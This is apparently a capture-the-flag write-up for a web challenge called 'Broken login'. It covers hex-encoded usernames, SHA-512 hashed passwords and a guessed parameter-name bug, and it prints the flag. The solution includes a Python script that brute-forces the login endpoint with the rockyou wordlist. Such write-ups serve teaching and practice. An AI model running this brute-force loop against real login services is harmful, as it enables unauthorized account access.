# Broken login (web/guessing, 365p, 20 solved)

## Description

```
Intern season is up again and our new intern Alex had to do a simple login page. 
Not only the login page is not working properly, it is also highly insecure...

Flag format: CTF{sha256}
```

In the task we get a webpage with login form.

## Task analysis

Once we type credentials in the form a POST is sent to `/login` and we get back redirect to `/auth` but our login got `hex-encoded`, parameter changed name from `name` to `username` and password turned into its `sha512`.

## Solution

### Guessing 

It took us a very long time to guess that `the login page is not working properly` from task description was supposed to hint that this parameter name change was a `bug`.

### Getting user

Once we go to `/auth` with `name` and `password` we get a new message `Invalid user`.
Since the task description mentions `Alex` and we know we just need to `hex-encode`, we try with `416c6578` and we get `Invalid password` now.

### Getting password

Now we spent very long time trying to guess the next step.
Description hints at `it is also highly insecure`, so we expected some web-vulnerability, maybe SQLi or at least a timing attack of some sort when comparing password.

Finally the crystal ball has spoken -> maybe let's just try bruteforce the password with `rockyou`?

```python
import codecs
import hashlib

import requests


def main():
    with codecs.open("rockyou.txt", 'rb') as pass_file:
        for p in pass_file.readlines():
            password = hashlib.sha512(p.strip()).hexdigest()
            print(password)
            name = 'Alex'.encode("hex")
            print(name)
            r = requests.get("http://35.234.65.24:31441/auth?name=" + name + "&password=" + password)
            if 'Invalid' not in r.text:
                print(p, r.text)
                break
            print(p, r.text)


main()
```

And after a moment we get: `CTF{bf3dd66e1c8e91683070d17ec2afb13375488eee109a0724bb872c9d70b7cc3d}`
